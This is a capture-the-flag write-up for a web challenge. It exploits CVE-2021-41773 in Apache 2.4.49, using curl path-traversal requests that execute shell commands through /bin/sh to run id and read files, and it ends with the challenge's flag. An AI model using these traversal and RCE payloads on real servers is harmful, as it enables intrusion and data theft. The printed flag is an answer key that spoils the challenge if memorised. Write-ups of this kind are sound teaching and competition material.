---
title: "Life Finds A Way — InGen Systems Specimen Catalogue"
ctf: "bitCTF"
date: 2026-06-19
category: web
difficulty: easy
points: TBD
flag_format: "bitctf{...}"
author: "CL4Y"
---

# Life Finds A Way — InGen Systems Specimen Catalogue

## Summary

The InGen archive runs `Apache/2.4.49`, the exact version vulnerable to
**CVE-2021-41773** (path traversal → RCE through `mod_cgi`). A POST to a
traversed `/cgi-bin/` URL pointing at `/bin/sh` executes the request body,
exposing the entrypoint script that defines the flag.

## Solution

### Step 1: Fingerprint the server

A single `HEAD` request leaks the version, and the homepage subtitle
"Species Catalogue **v4.49**" is a thematic wink:

```bash
$ curl -sI http://144.126.234.248/
HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)
```

Apache 2.4.49 with `mod_cgi` enabled → CVE-2021-41773 is in play.

### Step 2: Confirm the RCE surface

`/icons/` is a *read-only* alias (gives 403 on success). `/cgi-bin/` is a
**ScriptAlias** — any file reached through it is executed. A 500 on the
traversal probe is the RCE signature:

```bash
$ curl -s --path-as-is "http://144.126.234.248/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
500 Internal Server Error    # mod_cgi tried to exec /etc/passwd → confirms RCE path
```

### Step 3: Exploit and recover the flag

Pivot the traversal onto `/bin/sh` and POST shell commands. The deployed
`/opt/ingen/flag.txt` was an operator placeholder, but `/entrypoint.sh`
embeds the real flag as `DEFAULT_FLAG`:

```bash
#!/usr/bin/env bash
TARGET="http://144.126.234.248"
URL="$TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

# Sanity: prove RCE
curl -s --path-as-is --data 'echo Content-Type: text/plain; echo; id' "$URL"
# uid=1(daemon) gid=1(daemon) groups=1(daemon)

# Read the entrypoint — the real flag is the DEFAULT_FLAG literal
curl -s --path-as-is --data 'echo Content-Type: text/plain; echo; cat /entrypoint.sh' "$URL"
# DEFAULT_FLAG='bitctf{{l1f3_f1nds_4_w4y_CVE_2021_41773}}'
# FLAG="${FLAG:-$DEFAULT_FLAG}"
# echo "$FLAG" > /opt/ingen/flag.txt

# (The placeholder the operator left in flag.txt)
curl -s --path-as-is --data 'echo Content-Type: text/plain; echo; cat /opt/ingen/flag.txt' "$URL"
# bitctf{{ingen_droplet_test_flag}}
```

The `$FLAG` env var was set to a test placeholder at container start, so
`flag.txt` is junk. `/proc/1/environ` is root-only (we are `daemon`), so
the live env var is unreadable — but the default in `entrypoint.sh` is the
intended scoring flag.

## Flag

```
bitctf{{l1f3_f1nds_4_w4y_CVE_2021_41773}}
```
